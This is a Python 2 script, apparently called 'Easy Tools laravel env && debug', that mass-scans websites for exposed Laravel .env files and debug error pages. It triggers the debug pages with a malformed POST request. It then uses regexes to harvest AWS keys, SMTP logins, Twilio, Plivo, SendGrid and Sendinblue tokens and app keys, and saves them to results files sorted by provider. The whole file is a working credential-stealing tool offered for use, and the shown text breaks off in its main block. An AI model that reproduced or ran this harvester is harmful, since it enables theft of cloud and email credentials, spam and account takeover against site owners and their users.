# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
	os.mkdir('Results')
except:
	pass

try:
	os.mkdir('Results/URL/')
except:
	pass

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class easy:
	def get_awskey(self, text, url):
		try:
			if "AWS" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					acc_sid = reg('\nAWS_KEY=(.*?)\n', text)[0]
					secret_key = reg('\nAWS_SECRET_ACCESS_KEY=(.*?)\n', text)[0]
					region = reg('\nAWS_DEFAULT_REGION=(.*?)\n', text)[0]
				elif '<td>AWS_KEY</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					secret_key = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					region = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				elif "AWS_ACCESS_KEY=" in text:
					method = '/.env'
					acc_sid = reg('\nAWS_ACCESS_KEY=(.*?)\n', text)[0]
					secret_key = reg('\nAWS_SECRET_ACCESS_KEY=(.*?)\n', text)[0]
					region = reg('\nAWS_DEFAULT_REGION=(.*?)\n', text)[0]
				elif '<td>AWS_ACCESS_KEY</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>AWS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					secret_key = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					region = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				elif "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					acc_sid = reg('\nAWS_ACCESS_KEY_ID=(.*?)\n', text)[0]
					secret_key = reg('\nAWS_SECRET_ACCESS_KEY=(.*?)\n', text)[0]
					region = reg('\nAWS_DEFAULT_REGION=(.*?)\n', text)[0]
				elif '<td>AWS_ACCESS_KEY_ID</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					secret_key = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					region = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				if acc_sid == "null" or secret_key == "null" or acc_sid == "" or secret_key == "" or "*" in acc_sid or "*" in secret_key:
					return False
				else:
				    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
				    remover = str(build).replace('\r', '')
				    save = open('Results/URL/url-awskey.txt', 'a')
				    save.write(remover+'\n\n')
				    save.close()
				    awsk = str(acc_sid)+'|'+str(secret_key)+'|'+str(region)
				    rever = str(awsk).replace('\r', '')
				    se = open('Results/aws_key.txt', 'a')
				    se.write(rever+'\n')
				    se.close()
				    return True
			else:
			  return False
		except:
		 return False
	
	
	def get_appkey(self, text, url):
			if "APP_KEY" in text:
				if "APP_KEY=" in text:
					method = '/.env'
					acc_sid = reg('\nAPP_KEY=(.*?)\n', text)[0]
				elif '<td>APP_KEY</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				save = open('Results/vuln_appkey.txt', 'a')
				save.write(url+'\n')
				save.close()
				return True
	
	def get_plivo(self, text, url):
		try:
			if "PLIVO" in text:
				if "PLIVO_AUTH_ID=" in text:
					method = '/.env'
					try:
					 auth_id = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
					except:
					 try:
					  auth_id = reg('\nPLIVO_ID=(.*?)\n', text)[0]
					 except:
					  try:
					   auth_id = reg('\nPLIVO_API_ID=(.*?)\n', text)[0]
					  except:
					   auth_id = ''
					try:
					 auth_token = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
					 try:
					  auth_token = reg('\nPLIVO_TOKEN=(.*?)\n', text)[0]
					 except:
					  try:
					   auth_token = reg('\nPLIVO_API_TOKEN=(.*?)\n', text)[0]
					  except:
					   try:
					    auth_token = reg('\nPLIVO_TOKEN=(.*?)\n', text)[0]
					   except:
					   	auth_token = ''
				elif '<td>PLIVO_AUTH_ID</td>' in text:
					method = 'debug'
					try:
					 auth_id = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
					 try:
					  auth_id = reg('<td>PLIVO_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 except:
					  try:
					   auth_id = reg('<td>PLIVO_API_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					  except:
					   auth_id = ''
					try:
					 auth_token = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
					 try:
					  auth_token = reg('<td>PLIVO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 except:
					  try:
					   auth_token = reg('<td>PLIVO_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					  except:
					   auth_token = ''
				if auth_id == "null" or auth_id == "" or "*" in auth_id:
					return False
				else:
				 build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
				 remover = str(build).replace('\r', '')
				 save = open('Results/URL/url-plivo.txt', 'a')
				 save.write(remover+'\n\n')
				 save.close()
				 pliv = str(auth_id)+'|'+str(auth_token)
				 rever = str(pliv).replace('\r', '')
				 se = open('Results/plivo.txt', 'a')
				 se.write(rever+'\n')
				 se.close()
				 return True
			else:
			  return False
		except:
		 pass

	def get_sendg(self, text, url):
		try:
			if "SENDGRID" in text:
				if "SENDGRID_API_KEY=" in text:
					method = '/.env'
					try:
					 acc_sid = reg('\nSENDGRID_API_KEY=(.*?)\n', text)[0]
					except:
					 try:
					  acc_sid = reg('\nSENDGRID_KEY=(.*?)\n', text)[0]
					 except:
					  try:
					   acc_sid = reg('\nSENDGRID_APIKEY=(.*?)\n', text)[0]
					  except:
					   acc_sid = ''
				elif '<td>SENDGRID_API_KEY</td>' in text:
					method = 'debug'
					try:
					 acc_sid = reg('<td>SENDGRID_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
					 try:
					  acc_sid = reg('<td>SENDGRID_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 except:
					  try:
					   acc_sid = reg('<td>SENDGRID_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					  except:
					   acc_sid = ''
				if acc_sid == "null" or acc_sid == "" or "*" in acc_sid:
					return False
				else:
				 build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
				 remover = str(build).replace('\r', '')
				 save = open('Results/URL/url-sendg.txt', 'a')
				 save.write(remover+'\n\n')
				 save.close()
				 sendgr = str(acc_sid)
				 rever = str(sendgr).replace('\r', '')
				 se = open('Results/sendg_key.txt', 'a')
				 se.write(rever+'\n')
				 se.close()
				 return True
			else:
			  return False
		except:
		 pass
	
	def get_sendinblue(self, text, url):
		try:
			if "SENDINBLUE" in text:
				if "SENDINBLUE_API_KEY=" in text:
					method = '/.env'
					try:
					 acc_sid = reg('\nSENDINBLUE_API_KEY=(.*?)\n', text)[0]
					except:
					 try:
					  acc_sid = reg('\nSENDINBLUE_APIKEY=(.*?)\n', text)[0]
					 except:
					  try:
					   acc_sid = reg('\nSENDINBLUE_KEY=(.*?)\n', text)[0]
					  except:
					   acc_sid = ''
				elif '<td>SENDINBLUE_API_KEY</td>' in text:
					method = 'debug'
					try:
					 acc_sid = reg('<td>SENDINBLUE_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
					 try:
					  acc_sid = reg('<td>SENDINBLUE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					 except:
					  try:
					   acc_sid = reg('<td>SENDINBLUE_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					  except:
					   acc_sid = ''
				if acc_sid == "null" or acc_sid == "" or "*" in acc_sid:
					return False
				else:
				 build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
				 remover = str(build).replace('\r', '')
				 save = open('Results/URL/url-sendinblue.txt', 'a')
				 save.write(remover+'\n\n')
				 save.close()
				 sendgr = str(acc_sid)
				 rever = str(sendgr).replace('\r', '')
				 se = open('Results/sendinblue-key.txt', 'a')
				 se.write(rever+'\n')
				 se.close()
				 return True
			else:
			  return False
		except:
		 pass
	
	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:	 
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
				remover = str(build).replace('\r', '')
				save = open('Results/URL/url-nexmo.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
		except:
			return False


	def get_twilio(self, text, url):
		try:
			if "TWILIO" in text or "TWILLIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text or "TWILLIO_ACCOUNT_SID" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						try:
						 acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
						except:
						 try:
						  acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
						 except:
						  try:
						   acc_sid = reg('\nTWILLIO_SID=(.*?)\n', text)[0]
						  except:
						   try:
						    acc_sid = reg('\nTWILIO_AUTH_SID=(.*?)\n', text)[0]
						   except:
						    try:
						     acc_sid = reg('\nTWILIO_USER_SID=(.*?)\n', text)[0]
						    except:
						     try:
						      acc_sid = reg('\nTWILIO_USER_ID=(.*?)\n', text)[0]
						     except:
						      try:
						       acc_sid = reg('\nTWILIO_AUTH_ID=(.*?)\n', text)[0]
						      except:
						       try:
						        acc_sid = reg('\nTWILIO_ACCOUNT_ID=(.*?)\n', text)[0]
						       except:
						        try:
						         acc_sid = reg('\nTWILLIO_ACCOUNT_SID=(.*?)\n', text)[0]
						        except:
						         try:
						          acc_sid = reg('\nTWILIO_ACCOUNT=(.*?)\n', text)[0]
						         except:
						          acc_sid = ''
						          
						         
					try:
						acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						try:
						 auhtoken = reg('\nTWILIO_ACCOUNT_TOKEN=(.*?)\n', text)[0]
						except:
						 try:
						  auhtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
						 except:
						  try:
						   auhtoken = reg('\nTWILLIO_AUTH_TOKEN=(.*?)\n', text)[0]
						  except:
						   try:
						    auhtoken = reg('\nACCOUNT_TOKEN=(.*?)\n', text)[0]
						   except:
						    try:
						     auhtoken = reg('\nTWILIO_USER_TOKEN=(.*?)\n', text)[0]
						    except:
						     try:
						      auhtoken = reg('\nTWILIO_USER_PASSWORD=(.*?)\n', text)[0]
						     except:
						      try:
						       auhtoken = reg('\nTWILIO_ACCOUNT_PASSWORD=(.*?)\n', text)[0]
						      except:
						       try:
						        authtoken = reg('\nTWILLIO_TOKEN=(.*?)\n', text)[0]
						       except:
						        try:
						         auhtoken = reg('\nTWILIO_AUTH=(.*?)\n', text)[0]
						        except:
						         auhtoken = ""
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text or '<td>TWILLIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						try:
						 acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						except:
						 try:
						  acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						 except:
						  try:
						   acc_sid = reg('<td>TWILLIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						  except:
						   try:
						    acc_sid = reg('<td>TWILIO_AUTH_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						   except:
						    try:
						     acc_sid = reg('<td>TWILIO_USER_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						    except:
						     try:
						      acc_sid = reg('<td>TWILIO_USER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						     except:
						      try:
						       acc_sid = reg('<td>TWILIO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						      except:
						       try:
						        acc_sid = reg('<td>TWILIO_ACCOUNT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						       except:
						        try:
						         acc_sid = reg('<td>TWILLIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						        except:
						         acc_sid =  ''
					try:
						acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						try:
						 auhtoken = reg('<td>TWILIO_ACCOUNT_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						except:
						 try:
						  auhtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						 except:
						  try:
						   auhtoken = reg('<td>TWILLIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						  except:						   
						   try:
						    auhtoken = reg('<td>ACCOUNT_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						   except:
						    try:
						     auhtoken = reg('<td>TWILIO_USER_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						    except:
						     try:
						      auhtoken = reg('<td>TWILIO_USER_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						     except:
						      try:
						       auhtoken = reg('<td>TWILLIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						      except:
						       try:
						        auhtoken = reg('<td>TWILIO_AUTH<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
						       except:
						        auhtoken = ""
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('Results/URL/TWILLIO-LENGKAP.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				buid = str(acc_sid)+':'+str(auhtoken)
				remoer = str(buid).replace('\r', '')
				sae = open('Results/TWILLIO.txt', 'a')
				sae.write(remoer+'\n')
				sae.close()
				return True
			else:
				return False
		except:
			return False


	def get_smtp(self, text, url):
		try:
			if "SMTP_HOST" in text:
			 if "SMTP_HOST=" in text:
			  method = '/.env'
			  mailhost = reg("\nSMTP_HOST=(.*?)\n", text)[0]
			  mailport = reg("\nSMTP_PORT=(.*?)\n", text)[0]
			  mailuser = reg("\nSMTP_USERNAME=(.*?)\n", text)[0]
			  mailpass = reg("\nSMTP_PASSWORD=(.*?)\n", text)[0]
			  try:
			   mailfrom = reg("\nSMTP_FROM_ADDRESS=(.*?)\n", text)[0]
			  except:
			   mailfrom = "email@unknown.com"
			 if "<td>SMTP_HOST</td>" in text:
			  method = "debug"
			  mailhost = reg('<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			  mailport = reg('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			  mailuser = reg('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			  mailpass = reg('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			  try:
			   mailfrom = reg("<td>SMTP_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
			  except:
			   mailfrom = "email@unknown.com"
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
					 mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						try:
						 mailfrom = reg("\nMAIL_ADDRESS=(.*?)\n", text)[0]
						except:
						 try:
						  mailfrom = reg("\nMAIL_FROM=(.*?)\n", text)[0]
						 except:
						  mailfrom = 'email@unknown.com'
					try:
						fromname = reg("\MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
					 mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						try:
						 mailfrom = reg("<td>MAIL_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						except:
						 try:
						  mailfrom = reg("<td>MAIL_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
						 except:
						  mailfrom = 'email@unknown.com'
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = ''
				
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					# mod aws
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)
						remover = str(build).replace('\r', '')
						save = open('Results/URL/url-ses.txt', 'a')
						save.write(remover+'\n')
						save.close()
						smtppp = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						reer = str(smtppp).replace('\r', '')
						sew = open('Results/smtp-ses.txt', 'a')
						sew.write(reer+'\n')
						sew.close()
						awsk = str(mailuser)+'|'+str(mailpass)+'|'+str(getcountry)
						rever = str(awsk).replace('\r', '')
						se = open('Results/aws_key.txt', 'a')
						se.write(rever+'\n')
						se.close()
					elif "smtp.gmail.com" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/gmail.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_GmailDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					elif "yahoo" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/Yahoo.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_YahoDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					elif "mailgun.org" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/mailgun.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_MAILGUNDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					elif "smtp.office365.com" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/office365.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_OFFICE365DATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()	
					elif "smtp-relay.sendinblue.com" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/sendinblue.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_SENDINBLUEDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					elif "smtp.mandrillapp" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/mandrillapp.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_MANDRILLDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					elif "smtp.ionos" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/iosnos.txt', 'a')
						save.write(remover+'\n')
						save.close()
					elif "clickatell.com" in mailhost or "clickatell" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/smtp-clickatell.txt', 'a')
						save.write(remover+'\n')
						save.close()
					elif "smtp.sendgrid.net" in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/sendgrid.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_SENDGRIDDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					else:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n')
						save.close()
						datalengkap = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						penghapus = str(datalengkap).replace('\r', '')
						simpan = open('Results/SMTP_RANDOMDATA.txt', 'a')
						simpan.write(penghapus+'\n\n')
						simpan.close()
					return True
					
					
			else:
				return False
		except Exception as err:
		 simpan = open('Results/URL/url-error.txt', 'a')
		 simpan.write(url+'\n')
		 simpan.close()
		 print(str+(url)+" -> "+str(err))
		 return False

def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),

def main(ujl):
	resp = False
	headers = {'User-agent':'Mozilla/5.0'}
	try:
		text = '\033[32;1m#\033[0m '+ujl
		get_souce = requests.get(ujl+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False)
		get_source = get_souce.text
		if 'APP_NAME=' in get_source or 'APP_KEY=' in get_source or 'DB_HOST=' in get_source or get_souce.status_code == 200:
			resp = get_source
		else:
			get_source = requests.post(ujl, data={"0x[]":"easy"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
			if '<td>APP_NAME</td>' in get_source or 'phpdebugbar.addDataSet' in get_source or 'Whoops! There was an error.' in get_source:
			   resp = get_source
		if resp:
			getsmtp = easy().get_smtp(resp, ujl)
			get_plivo = easy().get_plivo(resp, ujl)
			getnexmo = easy().get_nexmo(resp, ujl)
			getwilio = easy().get_twilio(resp, ujl)
			getaws = easy().get_awskey(resp, ujl)
			getsendg = easy().get_sendg(resp, ujl)
			getsendinblue = easy().get_sendinblue(resp, ujl)
			get_appkey = easy().get_appkey(resp, ujl)
			if getsmtp:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if get_plivo:
				text += ' | \033[32;1mPLIVO\033[0m'
			else:
				text += ' | \033[31;1mPLIVO\033[0m'
			if getnexmo:
				text += ' | \033[32;1mNEXMO\033[0m'
			else:
				text += ' | \033[31;1mNEXMO\033[0m'
			if getwilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
			 text += ' | \033[31;1mTWILIO\033[0m'
			if getaws:
				text += ' | \033[32;1mAWS\033[0m'
			else:
				text += ' | \033[31;1mAWS\033[0m'
			if getsendg:
			 text += ' | \033[32;1mSENDGRID\033[0m'
			else:
				text += ' | \033[31;1mSENDGRID\033[0m'
			if getsendinblue:
			 text += ' | \033[32;1mSENDINBLUE\033[0m'
			else:
				text += ' | \033[31;1mSENDINBLUE\033[0m'
			if get_appkey:
				text += ' | \033[32;1mget_appkey\033[0m'
			else:
				text += ' | \033[31;1mget_appkey\033[0m'
			
			
		else:
		 text += ' | \033[31;1mCan\'t get everything\033[0m'
	except:
		text = '\033[31;1m#\033[0m '+ujl
		text += ' | \033[31;1mCan\'t access sites\033[0m'
	printf(text)

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])

if __name__ == '__main__':
    print('''
    Easy Tools laravel env && debug
     \n''')
    try:
        pid_restore = ".pid_restore"
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
